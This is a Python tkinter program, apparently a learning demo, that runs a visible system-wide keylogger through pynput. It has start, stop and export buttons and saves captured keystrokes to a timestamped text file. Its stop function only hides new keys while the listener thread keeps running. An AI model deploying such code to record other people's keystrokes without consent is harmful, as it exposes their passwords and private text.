import tkinter as tk
from tkinter import ttk
from pynput.keyboard import Listener
import threading
import datetime  # Import the datetime module

# Creating the GUI
window = tk.Tk()
window.title("KEYS Learning Software")
window.geometry("750x1000")  # Adjusted window size to 750x1000
window.configure(bg="grey")  # Change the background color to grey

# Calculate the height of the text box to fill about 50% of the window
text_box_height = int(window.winfo_screenheight() * 0.5 / 20)  # Adjusted height to fill 50% of the window

# Creating the text box
text_box = tk.Text(window, height=text_box_height, width=50)
text_box.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)  # Fill and expand the text box to fit the window

# Function that will display the key pressed to the GUI
def key_pressed(key):
    if not should_stop():
        key = str(key)
        key = key.replace("'", "")
        text_box.insert(tk.END, key + ' ')  # Add a space after each key press

# Flag to signal the keylogger thread to stop
keylogger_stopped = threading.Event()

# Function to check if the keylogger should stop
def should_stop():
    return keylogger_stopped.is_set()

# Function that will start the keylogger in a new thread
def start_keylogger_thread():
    keylogger_stopped.clear()
    t = threading.Thread(target=start_keylogger)
    t.start()

# Function that will start the keylogger
def start_keylogger():
    with Listener(on_press=key_pressed) as l:
        l.join()

# Function that will stop the keylogger without closing the program
def stop_keylogger():
    keylogger_stopped.set()

# Function for exporting the captured keystrokes to a log file with date and time in the name
def export_keystrokes():
    content = text_box.get("1.0", tk.END)
    # Generate the filename with date and time
    now = datetime.datetime.now()
    filename = f"captured_keystrokes_{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    with open(filename, "w") as file:
        file.write(content)

# Frame to center the buttons
button_frame = tk.Frame(window)
button_frame.pack(pady=20)

# Creating the button that will start the keylogger
start_button = ttk.Button(button_frame, text="Start Keylogger", command=start_keylogger_thread)
start_button.pack(side=tk.LEFT, padx=10)

# Creating the button that will stop the keylogger
stop_button = ttk.Button(button_frame, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(side=tk.LEFT, padx=10)

# Creating the "Export" button
export_button = ttk.Button(button_frame, text="Export", command=export_keystrokes)
export_button.pack(side=tk.LEFT, padx=10)

# Running the GUI
window.mainloop()